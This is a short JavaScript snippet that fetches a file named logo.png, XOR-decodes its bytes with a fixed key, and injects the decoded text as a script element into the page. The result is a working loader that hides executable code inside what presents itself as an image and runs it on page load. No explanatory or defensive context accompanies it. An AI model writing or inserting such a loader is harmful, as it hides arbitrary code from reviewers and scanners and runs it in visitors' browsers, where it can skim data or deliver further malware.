const key = [49, 120, 49];
fetch("./logo.png").then((response) => response.arrayBuffer()).then((buffer) => {
  const encrypted = new Uint8Array(buffer);
  const decodedBytes = [];
  for (let index = 0; index < encrypted.length; index++) {
    decodedBytes.push(encrypted[index]^key[index%key.length]);
  }
  const decoded = String.fromCharCode(...decodedBytes);
  const script = document.createElement("script");
  script.textContent = decoded;
  document.body.appendChild(script);
});
